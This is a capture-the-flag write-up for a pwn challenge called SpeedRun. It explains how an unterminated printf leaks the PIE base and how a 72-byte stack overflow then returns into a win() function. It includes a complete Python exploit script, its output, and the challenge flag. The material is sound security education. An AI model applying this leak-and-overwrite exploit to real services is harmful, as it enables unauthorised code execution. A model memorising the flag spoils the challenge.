# Challenge 2 — SpeedRun (Stack Overflow → ret2win via PIE leak)

> [← Back to index](../../README.md) · **Category:** Pwn · **Flag:** `MPTC{sw34ty_p4lms_fr4m3_p3rf3ct_n3w_pb}`

> *"A 100-hour RPG with an unskippable tutorial. The speedrunning community took that personally. The timer never sees it coming."*

```
nc 47.128.14.16 1337       # File: speedrun (inside SpeedRun.zip)
```

## Triage

```
ELF 64-bit PIE, NX enabled, Full RELRO, stripped
Imports: open, read, write, puts, printf, _exit ...
```

Static analysis with capstone reveals three key functions:

| Addr | Function | Notes |
|------|----------|-------|
| `0x12a6` | `win()` | `open("flag.txt")` → `read` → `write` "WORLD RECORD ... Flag: ". **No conditions.** |
| `0x1416` | `register_runner()` | reads **exactly 56 bytes** via a bounded loop (`0x139f`); stores a pointer to `main` (`base+0x1532`) at `[rbp-8]`, then `printf("Registered runner: %s")` |
| `0x1484` | `tutorial()` | `read(0, buf[rbp-0x40], 0x100)` — **64-byte buffer, 256-byte read → overflow** |

Offset from `tutorial()`'s buffer to the saved return address = `0x40 + 8 = 72`.

## The PIE problem

A naive **2-byte partial overwrite** (`0x1616` retaddr → `0x12a6` win) fails: the high nibble of byte 1 (bits 12–15) is randomized by PIE, so it needs a 1-in-16 guess *and* the right stack alignment. Brute-forcing all 16 nibbles still failed (alignment-dependent crash in `win`).

## The clean line — leak the PIE base in-band

`register_runner()` reads exactly 56 bytes into a 56-byte buffer and stores `base+0x1532` (a pointer to `main`) right after it, then prints the buffer with `%s`. Sending exactly 56 bytes makes `printf` walk off the end and **leak the text pointer** in the *same connection*:

- `leak = base + 0x1532`  →  `base = leak - 0x1532`  →  `win = base + 0x12a6`

Then overflow `tutorial()` with a full deterministic return address.

## Exploit

```python
import socket, struct, re, time
HOST, PORT = "47.128.14.16", 1337
WIN_OFF, LEAK_OFF = 0x12a6, 0x1532

def recv_until(s, marker, t=3.0):
    s.settimeout(t); buf=b""
    try:
        while marker not in buf:
            d=s.recv(4096)
            if not d: break
            buf+=d
    except socket.timeout: pass
    return buf

s=socket.socket(); s.settimeout(6); s.connect((HOST,PORT))
recv_until(s, b"runner tag:")

# Phase 1: leak. 56-byte tag -> printf %s leaks base+0x1532
s.sendall(b"A"*56)
resp = recv_until(s, b"Registered runner:") + recv_until(s, b"\n")
after = resp[resp.find(b"A"*56)+56:]
leak  = struct.unpack("<Q", after.split(b"\n",1)[0][:6].ljust(8,b"\x00"))[0]
base  = leak - LEAK_OFF
win   = base + WIN_OFF
assert base & 0xfff == 0, "bad leak"

# Phase 2: tutorial overflow, offset 72, ret2win
recv_until(s, b"> ")
s.sendall(b"A"*72 + struct.pack("<Q", win))

time.sleep(0.4); s.settimeout(2.5); out=b""
try:
    while True:
        d=s.recv(4096)
        if not d: break
        out+=d
except socket.timeout: pass
m=re.search(rb"MPTC\{[^}]*\}", out)
print("[+] FLAG:", m.group().decode() if m else out[-200:])
```

```
[*] leak=0x6367b375e532  base=0x6367b375d000  win=0x6367b375e2a6
[+] FLAG: MPTC{sw34ty_p4lms_fr4m3_p3rf3ct_n3w_pb}
```

## Files
- [`solve.py`](solve.py) — leak + ret2win exploit

**Flag:** `MPTC{sw34ty_p4lms_fr4m3_p3rf3ct_n3w_pb}`
